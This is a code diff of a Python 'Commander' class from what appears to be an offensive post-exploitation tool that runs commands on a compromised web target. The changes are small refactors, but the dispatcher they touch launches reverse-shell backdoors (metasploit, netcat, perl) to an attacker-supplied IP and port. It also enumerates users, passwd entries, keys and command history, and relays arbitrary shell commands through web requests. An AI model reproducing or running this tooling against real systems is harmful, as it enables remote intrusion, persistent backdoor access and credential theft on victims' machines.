@@ -20,7 +20,7 @@ except ImportError:
 else:
     pass
 
-    
+
 class Commander(object):
     '''
     Class to execute commands on the target
@@ -85,7 +85,7 @@ class Commander(object):
                             if command.split()[1] == "metasploit" or command.split()[1] == "msf":
                                 backdoor.msf(ip, port)
                             #elif command.split()[1] == "metasploit-php" or command.split()[1] == "msf-php":
-                            #    backdoor.msf(ip, port)
+                            #    backdoor.msf_php(ip, port)
                             elif command.split()[1] == "netcat" or command.split()[1] == "nc":
                                 backdoor.netcat(ip, port)
                             elif command.split()[1] == "perl" or command.split()[1] == "pl":
@@ -114,8 +114,8 @@ class Commander(object):
 
                     elif command.startswith('@enum'):
                         if len(command.split()) == 2:
-                            if command.split()[1] == "groups":
-                                enumerate.groups()
+                            if command.split()[1] == "group" or command.split()[1] == "groups":
+                                enumerate.group()
                             elif command.split()[1] == "history":
                                 enumerate.history()
                             elif command.split()[1] == "keys":
@@ -124,12 +124,12 @@ class Commander(object):
                                 enumerate.ip()
                             elif command.split()[1] == "os":
                                 enumerate.os()
+                            elif command.split()[1] == "passwd" or command.split()[1] == "users":
+                                enumerate.passwd()
                             elif command.split()[1] == "system":
                                 enumerate.system()
-                            elif command.split()[1] == "users":
-                                enumerate.users()                            
                             elif command.split()[1] == "writable":
-                                enumerate.writable()                            
+                                enumerate.writable()
                             else:
                                 enumerate.list()
                         else:
@@ -187,9 +187,8 @@ class Commander(object):
                                 command = command.replace('cp', 'cp -v') if command.split()[0] == 'cp' else command
                                 command = command.replace('ifconfig', '/sbin/ifconfig')
 
-                                cmd = 'cd {0};{1}'.format(self.cwd, command)
-
                                 # Get the source code cotenets
+                                cmd = 'cd {0};{1}'.format(self.cwd, command)
                                 source = make_request.get_page_source(cmd)
                                 if source:
                                     for line in source:
